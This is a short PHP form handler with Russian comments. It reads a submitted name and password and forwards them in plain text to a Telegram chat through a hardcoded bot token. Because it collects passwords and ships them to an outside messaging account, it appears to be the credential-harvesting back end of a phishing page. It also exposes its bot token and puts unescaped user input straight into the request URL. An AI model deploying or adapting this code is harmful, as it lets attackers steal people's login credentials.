<?php
// Ваши настройки
$token = "8284392559:AAHeIOGAXPyBV-piWj4YM8bK2k2LIlhGftc";
$chat_id = "1726497593";

// Собираем данные из формы
$name = $_POST['name'];
$password = $_POST['password'];

// Формируем текст сообщения
$arr = array(
  'Новая заявка с сайта' => '',
  'Имя: ' => $name,
  'Пароль: ' => $password,
);

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

// Отправляем запрос в Telegram API
$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

if ($sendToTelegram) {
  echo "Спасибо! Ваше сообщение отправлено.";
} else {
  echo "Ошибка. Попробуйте еще раз.";
}
?>